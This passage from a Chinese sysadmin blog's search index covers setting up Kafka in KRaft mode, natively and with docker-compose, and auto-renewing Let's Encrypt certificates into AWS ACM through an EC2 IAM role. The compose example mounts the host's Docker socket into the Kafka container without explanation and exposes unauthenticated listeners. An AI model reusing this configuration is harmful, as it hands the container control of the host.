class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 放kafka的数据文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /var/lib/kafka\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e二、下载并配置kafka\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 释放到指定目录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar -xzf kafka_2.13-3.5.0.tgz -C /opt/kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 修改/opt/kafka/config/server.properties\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprocess.roles\u003cspan class=\"o\"\u003e=\u003c/span\u003ebroker,controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode.id\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econtroller.quorum.voters\u003cspan class=\"o\"\u003e=\u003c/span\u003e1@localhost:9093\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elisteners\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ePLAINTEXT://localhost:9092,CONTROLLER://localhost:9093\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog.dirs\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/lib/kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 然后需要再追加到server.properties的部分\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata.log.dir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/lib/kafka/metadata\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enum.replica.fetchers\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eoffsets.topic.replication.factor\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etransaction.state.log.replication.factor\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etransaction.state.log.min.isr\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、初始化kafka集群\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 生成一个uuid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euuidgen\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edc66bcb0-758e-4360-843d-5ccb1da2ee74\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 初始化\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /opt/kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebin/kafka-storage.sh format -t \u0026lt;UUID\u0026gt; -c config/server.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 启动\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebin/kafka-server-start.sh config/server.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 检查一下代理的状态\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebin/kafka-broker-api-versions.sh --bootstrap-server localhost:9092\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e四、推送数据验证\u003c/p\u003e","title":"单机部署kafka用kraft不依赖zookeeper"},{"content":"用redpanda居然还要每隔30天更新一下License文件，叔可忍婶不可忍啊。\n换掉换掉，直接用Docker部署kafka，后端不用zookeeper，用kraft，天下苦zk也久矣！\n方法很简单，用docker-compose，编辑docker-compose.yml文件\nname: \u0026#39;stream\u0026#39; services: kafka: image: confluentinc/cp-kafka:latest hostname: kafka container_name: kafka ports: - 9092:9092 - 9093:9093 environment: KAFKA_KRAFT_MODE: true # This enables KRaft mode in Kafka. KAFKA_PROCESS_ROLES: controller,broker # Kafka acts as both broker and controller. KAFKA_NODE_ID: 1 # A unique ID for this Kafka instance. KAFKA_CONTROLLER_QUORUM_VOTERS: 1@10.8.1.119:9093 # Defines the controller voters. KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093 KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,CONTROLLER:PLAINTEXT KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://10.8.1.119:9092 KAFKA_LOG_DIRS: /var/lib/kafka/data # Where Kafka stores its logs. KAFKA_AUTO_CREATE_TOPICS_ENABLE: true # Kafka will automatically create topics if needed. KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1 # Since we’re running one broker, one replica is enough. KAFKA_LOG_RETENTION_HOURS: 168 # Keep logs for 7 days. KAFKA_GROUP_INITIAL_REBALANCE_DELAY_MS: 0 # No delay for consumer rebalancing. CLUSTER_ID: Mk3OEYBSD34fcwNTJENDM2Qk # A unique ID for the Kafka cluster. volumes: - /var/run/docker.sock:/var/run/docker.sock - ./data:/var/lib/kafka/data # Store Kafka logs on your local machine. 注意以上的文件，暴露了2个端口，9092和9093，9092用于客户端连接，9093用于集群通讯；KAFKA_KRAFT_MODE: true用kraft不用zk. ClUSTER_ID可以换个不同的。\n另外配置有两个10.8.1.119地址，这是Docker宿主机的ip，这是对外开放必须要改的。 然后文件卷，docker-compose.yml文件的同级目录有个data文件夹，这个文件夹的属主必须是id=1000的用户，在我们的系统中是第一个添加的用户，debian\n所以要设置一下属主：\nchown -R debian:debian data 如果属主不是1000，会爆出以下报错信息并退出：\nkafka | ===\u0026gt; User kafka | uid=1000(appuser) gid=1000(appuser) groups=1000(appuser) kafka | ===\u0026gt; Configuring ... kafka | ===\u0026gt; Running preflight checks ... kafka | ===\u0026gt; Check if /var/lib/kafka/data is writable ... kafka | Command [/usr/local/bin/dub path /var/lib/kafka/data writable] FAILED ! kafka exited with code 1 然后启动即可：\ndocker-compose up -d 随后测试一下：\n#进入容器bash docker exec -it kafka bash #建立一个test-topic /usr/bin/kafka-topics --create --topic test-topic --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1 #发点消息进去 /usr/bin/kafka-console-producer --broker-list localhost:9092 --topic test-topic \u0026gt; Hello Kafka! \u0026gt; This is a test message. #另外一个客户端收消息 /usr/bin/kafka-console-consumer --bootstrap-server localhost:9092 --topic test-topic - Hello Kafka! This is a test message. #查看所有的topics /usr/bin/kafka-topics --list --bootstrap-server localhost:9092 ","permalink":"https://rendoumi.com/posts/20250728-kafka_kraft_docker/","summary":"\u003cp\u003e用\u003ccode\u003eredpanda\u003c/code\u003e居然还要每隔30天更新一下License文件，叔可忍婶不可忍啊。\u003c/p\u003e\n\u003cp\u003e换掉换掉，直接用Docker部署kafka，后端不用zookeeper，用kraft，天下苦zk也久矣！\u003c/p\u003e\n\u003cp\u003e方法很简单，用docker-compose，编辑\u003ccode\u003edocker-compose.yml\u003c/code\u003e文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ename: \u003cspan class=\"s1\"\u003e\u0026#39;stream\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  kafka:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: confluentinc/cp-kafka:latest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    hostname: kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 9092:9092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 9093:9093\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_KRAFT_MODE: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# This enables KRaft mode in Kafka.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_PROCESS_ROLES: controller,broker  \u003cspan class=\"c1\"\u003e# Kafka acts as both broker and controller.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_NODE_ID: \u003cspan class=\"m\"\u003e1\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# A unique ID for this Kafka instance.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_CONTROLLER_QUORUM_VOTERS: 1@10.8.1.119:9093  \u003cspan class=\"c1\"\u003e# Defines the controller voters.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,CONTROLLER:PLAINTEXT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://10.8.1.119:9092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_LOG_DIRS: /var/lib/kafka/data  \u003cspan class=\"c1\"\u003e# Where Kafka stores its logs.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_AUTO_CREATE_TOPICS_ENABLE: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Kafka will automatically create topics if needed.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: \u003cspan class=\"m\"\u003e1\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Since we’re running one broker, one replica is enough.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_LOG_RETENTION_HOURS: \u003cspan class=\"m\"\u003e168\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Keep logs for 7 days.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_GROUP_INITIAL_REBALANCE_DELAY_MS: \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# No delay for consumer rebalancing.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      CLUSTER_ID: Mk3OEYBSD34fcwNTJENDM2Qk  \u003cspan class=\"c1\"\u003e# A unique ID for the Kafka cluster.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - /var/run/docker.sock:/var/run/docker.sock\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - ./data:/var/lib/kafka/data  \u003cspan class=\"c1\"\u003e# Store Kafka logs on your local machine.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意以上的文件，暴露了2个端口，9092和9093，9092用于客户端连接，9093用于集群通讯；\u003ccode\u003eKAFKA_KRAFT_MODE: true\u003c/code\u003e用kraft不用zk. ClUSTER_ID可以换个不同的。\u003c/p\u003e","title":"用Docker部署kafka且不依赖zookeeper"},{"content":"交代一下背景：\n公司在AWS上用的是EKS+Fargate，还有一个跳板机，证书呢就不太想用aws收费的了，干脆用免费的证书好了。\n那问题就来了，Let‘s encrypt的证书90天到期，已经手动更新过3次了，实在太麻烦了，能不能自动申请并更新到ACM呢？\n答案是可以的，原理是：利用EC2可以携带IAM角色的原理，就可以无凭证更新免费证书到AWS Certificate Manager了\n做法如下：\n一、首先去ACM中拿到证书的ARN，要确保IAM权限不外泄，避免更新错证书\n二、生成一个IAM的policy，命名为AllowUpdateCertificate，只允许更新这两个特定的证书\n具体策略内容如下：\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;acm:ImportCertificate\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn01\u0026#34;, \u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn02\u0026#34; ] } ] } 三、IAM生成一个role角色，命名为Ec2UpdateCertificateRole，把AllowUpdateCertificate策略给附上\n四、到EC2的实例详细信息中，操作\u0026ndash;\u0026gt;安全\u0026ndash;\u0026gt;修改IAM角色\n附上Ec2UpdateCertificateRole这个角色\n五、在EC2的机器上，装好AWS CLI，还有lego(申请Let\u0026rsquo;s encrypt证书的软件)\n先写好获得证书的脚本 get_cert.sh，域名DNS解析是托管到cloudflare的，所以也直接用API TOKEN来处理\n#!/bin/bash CLOUDFLARE_DNS_API_TOKEN=######## /usr/local/bin/lego --path /usr/local/bin/certs --email zhangranrui@rendoumi.com --dns cloudflare --domains *.rendoumi.com --domains rendoumi.com renew --renew-hook=\u0026#34;/usr/local/bin/update_aws_cert.sh\u0026#34; 参数--renew-hook如果有新证书，就调用后面的脚本。如果没有新证书，就无操作，避免无用功。\n然后再写好 update_aws_cert.sh，这就是个千字文了，由gemini生成的：\n由于lego生成的crt是证书+证书链，所以第一步要把证书部分给单独拆出来\n#!/bin/bash cd /usr/local/bin/certs/certificates #首先把证书单独拆出来 awk \u0026#39;/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/ {print} /-----END CERTIFICATE-----/ {exit}\u0026#39; _.rendoumi.com.crt \u0026gt; _.rendoumi.com.only # --- 配置部分 --- # 您要更新的现有 ACM 证书的 ARN # 示例：CERTIFICATE_ARN=\u0026#34;arn:aws:acm:ap-southeast-1:123456789012:certificate/abcdefab-1234-5678-abcd-1234567890ab\u0026#34; CERTIFICATE_ARN=\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/11111111-1111-1111-1111-111111111111\u0026#34; # 新证书文件的路径（例如：/opt/certs/new_certificate.crt） # 确保这个路径在您的EC2实例上是正确的 CERTIFICATE_BODY_PATH=\u0026#34;_.rendoumi.com.only\u0026#34; # 新私钥文件的路径（例如：/opt/certs/private.key） # 确保这个路径在您的EC2实例上是正确的 PRIVATE_KEY_PATH=\u0026#34;_.rendoumi.com.key\u0026#34; # 证书链文件的路径（可选） # 如果没有证书链，请将此变量留空或注释掉 # 示例：CERTIFICATE_CHAIN_PATH=\u0026#34;/opt/certs/ca_bundle.crt\u0026#34; CERTIFICATE_CHAIN_PATH=\u0026#34;_.rendoumi.com.issuer.crt\u0026#34; # 如果没有链，请将其留空 \u0026#34;\u0026#34; # ACM 证书所在的 AWS 区域 # 这个区域应该与 CERTIFICATE_ARN 中的区域匹配 # 示例：AWS_REGION=\u0026#34;ap-southeast-1\u0026#34; AWS_REGION=\u0026#34;ap-southeast-1\u0026#34; # --- 配置部分结束 --- echo \u0026#34;--- 开始使用实例角色重新导入 ACM 证书 ---\u0026#34; echo \u0026#34;证书 ARN: ${CERTIFICATE_ARN}\u0026#34; echo \u0026#34;区域: ${AWS_REGION}\u0026#34; # 检查文件是否存在 if [ ! -f \u0026#34;${CERTIFICATE_BODY_PATH}\u0026#34; ]; then echo \u0026#34;错误：证书文件 \u0026#39;${CERTIFICATE_BODY_PATH}\u0026#39; 不存在。\u0026#34; exit 1 fi if [ ! -f \u0026#34;${PRIVATE_KEY_PATH}\u0026#34; ]; then echo \u0026#34;错误：私钥文件 \u0026#39;${PRIVATE_KEY_PATH}\u0026#39; 不存在。\u0026#34; exit 1 fi if [ -n \u0026#34;${CERTIFICATE_CHAIN_PATH}\u0026#34; ] \u0026amp;\u0026amp; [ ! -f \u0026#34;${CERTIFICATE_CHAIN_PATH}\u0026#34; ]; then echo \u0026#34;警告：证书链文件 \u0026#39;${CERTIFICATE_CHAIN_PATH}\u0026#39; 已指定但不存在。将不包含证书链进行导入。\u0026#34; CERTIFICATE_CHAIN_PATH=\u0026#34;\u0026#34; # 如果文件不存在，则清空路径 fi # 构造 AWS CLI 命令。AWS CLI 会自动使用实例角色提供的凭证。 IMPORT_CMD=\u0026#34;aws acm import-certificate \\ --certificate-arn ${CERTIFICATE_ARN} \\ --certificate fileb://${CERTIFICATE_BODY_PATH} \\ --private-key fileb://${PRIVATE_KEY_PATH} \\ --region \\\u0026#34;${AWS_REGION}\\\u0026#34;\u0026#34; # 如果有证书链，则添加到命令中 if [ -n \u0026#34;${CERTIFICATE_CHAIN_PATH}\u0026#34; ]; then IMPORT_CMD=\u0026#34;${IMPORT_CMD} --certificate-chain fileb://${CERTIFICATE_CHAIN_PATH}\u0026#34; fi echo \u0026#34;正在执行命令：\u0026#34; echo \u0026#34;$IMPORT_CMD\u0026#34; echo \u0026#34;--------------------------\u0026#34; # 执行命令 # 注意：这里我们不指定 --profile 或任何凭证，AWS CLI 会自动使用实例IAM角色。 eval $IMPORT_CMD # 检查命令执行结果 if [ $? -eq 0 ]; then echo \u0026#34;--- 证书重新导入成功！---\u0026#34; echo \u0026#34;ACM 证书 ${CERTIFICATE_ARN} 已更新。\u0026#34; else echo \u0026#34;--- 证书重新导入失败！---\u0026#34; echo \u0026#34;请检查错误消息，确保：\u0026#34; echo \u0026#34;1. EC2 实例已正确附加了具有 acm:ImportCertificate 权限的 IAM 角色。\u0026#34; echo \u0026#34;2. 证书、私钥和链文件路径正确且可读。\u0026#34; echo \u0026#34;3. 证书/私钥/链的格式正确。\u0026#34; fi echo \u0026#34;--- 脚本执行完毕 ---\u0026#34; 看起来真的是又臭又长，废话连篇。注意：gemini 生成的代码有问题，aws acm import-certificate 的参数中，证书文件的前缀是fileb://，gemini给的是file://，调试了半天，最后去aws看了文档才发现。\n如上操作，脚本放入到crontb中，没有用到任何aws access id和secret，就能正确更新证书，善莫大焉。\n","permalink":"https://rendoumi.com/posts/20250725-aws_route53_update_certificate/","summary":"\u003cp\u003e交代一下背景：\u003c/p\u003e\n\u003cp\u003e公司在AWS上用的是EKS+Fargate，还有一个跳板机，证书呢就不太想用aws收费的了，干脆用免费的证书好了。\u003c/p\u003e\n\u003cp\u003e那问题就来了，Let‘s encrypt的证书90天到期，已经手动更新过3次了，实在太麻烦了，能不能自动申请并更新到ACM呢？\u003c/p\u003e\n\u003cp\u003e答案是可以的，原理是：利用EC2可以携带IAM角色的原理，就可以无凭证更新免费证书到AWS Certificate Manager了\u003c/p\u003e\n\u003cp\u003e做法如下：\u003c/p\u003e\n\u003cp\u003e一、首先去ACM中拿到证书的ARN，要确保IAM权限不外泄，避免更新错证书\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725144718592\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725144718592.png\"\u003e\u003c/p\u003e\n\u003cp\u003e二、生成一个IAM的policy，命名为\u003ccode\u003eAllowUpdateCertificate\u003c/code\u003e，只允许更新这两个特定的证书\u003c/p\u003e\n\u003cp\u003e具体策略内容如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"s2\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;2012-10-17\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"s2\"\u003e\u0026#34;Statement\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;acm:ImportCertificate\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn01\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn02\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20250725145030921\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725145030921.png\"\u003e\u003c/p\u003e\n\u003cp\u003e三、IAM生成一个role角色，命名为\u003ccode\u003eEc2UpdateCertificateRole\u003c/code\u003e，把\u003ccode\u003eAllowUpdateCertificate\u003c/code\u003e策略给附上\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725145132762\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725145132762.png\"\u003e\u003c/p\u003e\n\u003cp\u003e四、到EC2的实例详细信息中，操作\u0026ndash;\u0026gt;安全\u0026ndash;\u0026gt;修改IAM角色\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725145419632\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725145419632.png\"\u003e\u003c/p\u003e\n\u003cp\u003e附上\u003ccode\u003eEc2UpdateCertificateRole\u003c/code\u003e这个角色\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725145533303\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725145533303.png\"\u003e\u003c/p\u003e\n\u003cp\u003e五、在EC2的机器上，装好AWS CLI，还有lego(申请Let\u0026rsquo;s encrypt证书的软件)\u003c/p\u003e\n\u003cp\u003e先写好获得证书的脚本 get_cert.sh，域名DNS解析是托管到cloudflare的，所以也直接用API TOKEN来处理\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 